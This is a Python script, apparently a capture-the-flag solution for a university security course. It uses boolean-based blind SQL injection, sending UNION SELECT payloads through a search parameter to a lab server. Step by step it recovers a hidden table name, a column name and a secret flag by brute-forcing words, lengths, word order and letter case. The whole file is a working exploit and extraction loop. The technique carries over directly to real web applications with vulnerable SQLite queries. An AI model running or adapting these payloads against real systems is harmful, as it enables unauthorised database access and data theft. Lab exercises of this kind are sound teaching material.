import requests

SERVER='http://mustard.stt.rnl.tecnico.ulisboa.pt:22262'

s = requests.Session()
r = s.get(SERVER)

# HIDDEN TABLE NAME
# [1] Words present on the name
with open('word_list.txt') as word_list: 
    for word in word_list: 
        params = {'search' : 'my search\' UNION SELECT \'a\', sql, name FROM sqlite_master WHERE type =\'table\' AND name LIKE \'%'+word[:-1]+'%\' --'}
        r = requests.get(SERVER, params=params)
        if('Found 1 article' in r.text):
            print(word[:-1])

# [2] Length of the name
for i in range(0, 20): 
    params = {'search' : 'my search\' UNION SELECT \'a\', sql, name FROM sqlite_master WHERE type =\'table\' AND name LIKE \'super_' + '_'*i + '_secrets\' --'}
    r = requests.get(SERVER, params=params)
    if('Found 1 articles' in r.text):
        print(i)

# [3] Remaining chars 
char_list = 'abcdefghijklmnopqrstuvwxyz_.-'

for char in char_list: 
    params = {'search' : 'my search\' UNION SELECT \'a\', sql, name FROM sqlite_master WHERE type =\'table\' AND name LIKE \'super_%' + char + '%_secrets\' --'}
    r = requests.get(SERVER, params=params)
    if('Found 1 articles' in r.text):
       print(char)

# COLUMN NAME
# [4] Words present on the name
with open('word_list.txt') as word_list: 
    for word in word_list: 
        params = {'search' : 'my search\' UNION SELECT '+ word[:-1] + ', \'a\', \'b\' FROM super_s_sof_secrets --'}
        r = requests.get(SERVER, params=params)
        if('Found 1 article' in r.text):
            print(word[:-1])

# CONTENT OF THE POST - FLAG
# [5] Words present on the flag on the post
with open('word_list.txt') as word_list: 
    for word in word_list: 
        params = {'search' : 'my search\' UNION SELECT id, secret, \'a\' FROM super_s_sof_secrets WHERE secret LIKE \'%SSof{%' + word[:-1] + '%}%\' --'}
        r = requests.get(SERVER, params=params)
        if('Found 1 article' in r.text):
            print(word[:-1])

# [6] Size of the flag
for i in range(0, 100): 
    params = {'search' : 'my search\' UNION SELECT id, secret, \'a\' FROM super_s_sof_secrets WHERE secret LIKE \'%SSof{'+'_'*i+'}%\' --'}
    r = requests.get(SERVER, params=params)
    if('Found 1 articles' in r.text):
        print(i)

# [7] Order of words in the flag
word_list = ['am','blind','boolean','can','data','get','injection','only','partially','since','using','your']

for word in word_list: 
    params = {'search' : 'my search\' UNION SELECT id, secret, \'a\' FROM super_s_sof_secrets WHERE secret LIKE \'%SSof{%_can_get_your_data_using_boolean_' + word + '%}%\' --'}
    r = requests.get(SERVER, params=params)
    if('Found 1 articles' in r.text):
       print(word)

# [8] Capitalization of the words
flag = 'i_am_only_partially_blind_since_i_can_get_your_data_using_boolean_injection'

payload = ''
index = 0
for char in flag: 
    if(flag[index] == '_'):
        payload += '_'
        index += 1
        continue

    upper_case = flag[index].upper()
    lower_case = flag[index].lower()
    payload_upper = payload + upper_case
    payload_lower = payload + lower_case    

    params = {'search' : 'my search\' UNION SELECT id, secret, \'a\' FROM super_s_sof_secrets WHERE secret GLOB \'*SSof{'+payload_upper+'*}*\' --'}
    r = requests.get(SERVER, params=params)
    if('Found 1 articles' in r.text):
        payload += upper_case

    params = {'search' : 'my search\' UNION SELECT id, secret, \'a\' FROM super_s_sof_secrets WHERE secret GLOB \'*SSof{'+payload_lower+'*}*\' --'}
    r = requests.get(SERVER, params=params)
    if('Found 1 articles' in r.text):
        payload += lower_case

    index += 1

print(payload)
